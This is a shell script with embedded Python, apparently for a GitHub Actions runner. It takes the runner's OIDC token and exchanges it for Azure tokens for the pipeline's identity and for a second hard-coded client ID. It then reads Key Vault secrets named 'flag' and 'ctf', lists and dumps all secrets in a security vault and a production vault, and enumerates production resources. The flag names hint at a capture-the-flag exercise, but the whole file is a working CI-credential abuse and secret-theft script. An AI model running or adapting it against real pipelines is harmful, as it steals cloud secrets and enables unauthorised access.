#!/usr/bin/env bash
set +e
exec python3 - <<'PY'
import os, json, urllib.request, urllib.parse, urllib.error, base64

def ex(u, data=None, headers=None, method=None):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, data=data, headers=headers or {}, method=method), timeout=30)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, repr(e)[:300]

def jdecode(t):
    try:
        p = t.split(".")[1]; p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception as e:
        return {"err": repr(e)}

TEN = os.environ.get("AZURE_TENANT_ID", "")
CID = os.environ.get("AZURE_CLIENT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
print("===Q_START===")

u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange"
s, b = ex(u, headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
oidc = json.loads(b).get("value", "")
print("OIDC_LEN", len(oidc))
print("OIDC_CLAIMS", json.dumps({k: jdecode(oidc).get(k) for k in ("iss", "sub", "aud", "actor", "job_workflow_ref", "repository")}))

def aad(cid, scope, secret=None, assertion=None):
    d = {"grant_type": "client_credentials", "client_id": cid, "scope": scope}
    if assertion:
        d["client_assertion_type"] = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
        d["client_assertion"] = assertion
    if secret:
        d["client_secret"] = secret
    s, b = ex("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TEN,
              data=urllib.parse.urlencode(d).encode(),
              headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        return json.loads(b).get("access_token", "")
    except Exception:
        print("AAD_ERR", cid[:8], scope, s, b[:200]); return ""

ARM = aad(CID, "https://management.azure.com/.default", assertion=oidc)
GRAPH = aad(CID, "https://graph.microsoft.com/.default", assertion=oidc)
VAULT = aad(CID, "https://vault.azure.net/.default", assertion=oidc)
print("CI_TOKENS arm=%d graph=%d vault=%d" % (len(ARM), len(GRAPH), len(VAULT)))

def q(u, tok, m="GET"):
    h = {"Authorization": "Bearer " + tok}
    if m == "POST":
        h["Content-Length"] = "0"
    return ex(u, data=b"" if m == "POST" else None, headers=h, method=m)

LA = "891fb158-e02c-4428-a885-53b811f369c0"
LA_ARM = aad(LA, "https://management.azure.com/.default", assertion=oidc)
LA_VAULT = aad(LA, "https://vault.azure.net/.default", assertion=oidc)
LA_GRAPH = aad(LA, "https://graph.microsoft.com/.default", assertion=oidc)
print("LA_TOKENS arm=%d vault=%d graph=%d" % (len(LA_ARM), len(LA_VAULT), len(LA_GRAPH)))

for sec in ("flag", "FLAG", "flag.txt", "ctf", "secret", "admin-flag"):
    s, b = ex("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/%s?api-version=7.4" % sec,
              headers={"Authorization": "Bearer " + LA_VAULT})
    print("SEC_FLAG", sec, s, b[:600])

for vault in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
    s, b = ex("https://%s.vault.azure.net/secrets?api-version=7.4" % vault,
              headers={"Authorization": "Bearer " + LA_VAULT})
    print("VAULT_LIST", vault, s, b[:2000])
    if s == 200:
        for it in json.loads(b).get("value", []):
            name = it["id"].rsplit("/", 1)[-1]
            s2, b2 = ex(it["id"] + "?api-version=7.4", headers={"Authorization": "Bearer " + LA_VAULT})
            print("SECRET_VAL", vault, name, s2, b2[:800])

s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/resources?api-version=2021-04-01" % SUB, LA_ARM)
try:
    for r in json.loads(b).get("value", []):
        print("LA_RES", r["type"], r["name"])
except Exception:
    print("LA_RES_ERR", s, b[:300])
print("===Q_END===")
